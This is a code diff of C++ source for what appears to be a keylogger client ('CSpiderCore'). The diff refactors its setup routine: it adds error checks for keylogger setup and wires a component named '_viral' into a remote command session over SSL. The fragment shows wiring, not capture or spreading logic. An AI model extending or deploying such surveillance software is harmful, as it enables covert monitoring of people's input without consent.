@@ -42,12 +42,7 @@ namespace spi
         bool run()
         {
             _log(logging::Debug) << "Starting now" << std::endl;
-            __setupSigHandlers();
-            if (!__setup())
-                return false;
             _keyLogger->run();
-            _viral.setup(_keyLogger.get());
-            _log(logging::Info) << "Client started successfully" << std::endl;
             _io.run();
             return true;
         }
@@ -82,7 +77,7 @@ namespace spi
 
         void __startAcceptor()
         {
-            _sess = new ServerCommandSession(_io, _ctx);
+            _sess = new ServerCommandSession(_io, _ctx, _viral);
             _acc.onAccept(_sess->connection(), boost::bind(&CSpiderCore::__handleAccept, this, net::ErrorPlaceholder));
         }
 
@@ -100,8 +95,10 @@ namespace spi
             }
         }
 
-        bool __setup() noexcept
+    public:
+        bool setup() noexcept
         {
+            __setupSigHandlers();
             if (!_ctx.usePrivateKeyFile(_conf.keyFile) || !_ctx.useCertificateFile(_conf.certFile)) {
                 _log(logging::Error) << "Failed setting up a valid SSL context" << std::endl;
                 return false;
@@ -110,7 +107,8 @@ namespace spi
             _logHandle.setIOManager(_io);
             if (!_logHandle.setup())
                 return false;
-            _keyLogger->setup(); //TODO: check
+            if (!_keyLogger->setup())
+                return false;
 
             _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
                 _logHandle.appendEntry(event);
@@ -124,6 +122,9 @@ namespace spi
             _keyLogger->onWindowChangeEvent([this](proto::WindowChanged &&event) {
                 _logHandle.appendEntry(event);
             });
+            if (!_viral.setup(_keyLogger.get())) {
+                return false;
+            }
             return true;
         }
 
